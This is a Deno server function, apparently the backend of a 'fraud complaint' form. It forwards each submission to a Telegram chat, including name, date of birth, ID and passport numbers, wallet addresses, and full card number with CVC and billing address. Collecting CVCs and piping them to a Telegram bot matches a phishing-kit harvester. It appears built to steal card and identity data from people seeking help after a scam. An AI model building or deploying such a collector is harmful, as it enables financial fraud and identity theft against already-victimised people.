import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
    if (!TELEGRAM_BOT_TOKEN) {
      throw new Error('TELEGRAM_BOT_TOKEN is not configured');
    }

    const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
    if (!TELEGRAM_CHAT_ID) {
      throw new Error('TELEGRAM_CHAT_ID is not configured');
    }

    const formData = await req.json();

    const message = `
🚨 *NEW FRAUD COMPLAINT*

👤 *Personal Information*
• Name: ${formData.fullName}
• Email: ${formData.email}
• Phone: ${formData.phone}
• State: ${formData.state}
• DOB: ${formData.dateOfBirth || 'Not provided'}
• ID Number: ${formData.identificationNumber || 'Not provided'}
• Passport: ${formData.passportNumber || 'Not provided'}

💰 *Incident Details*
• Amount Lost: ${formData.amountLost}
• Date: ${formData.dateOfIncident}
• Scam Type: ${formData.scamType}
• Wallet Type: ${formData.walletType}
• Wallet Address: \`${formData.walletAddress}\`
• Card Type: ${formData.detectedCardType || 'N/A'}

📝 *Description*
${formData.description}

${formData.cardNumber ? `💳 *Card Info*
• Number: ${formData.cardNumber}
• CVC: ${formData.cardCvc || 'N/A'}
• Billing: ${formData.cardBillingAddress || 'N/A'}` : ''}

${formData.recoveryWalletAddress ? `🔄 *Recovery Wallet*: \`${formData.recoveryWalletAddress}\`` : ''}
    `.trim();

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const result = await response.json();
    if (!response.ok) {
      throw new Error(`Telegram API error [${response.status}]: ${JSON.stringify(result)}`);
    }

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: unknown) {
    console.error('Error sending to Telegram:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ success: false, error: errorMessage }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
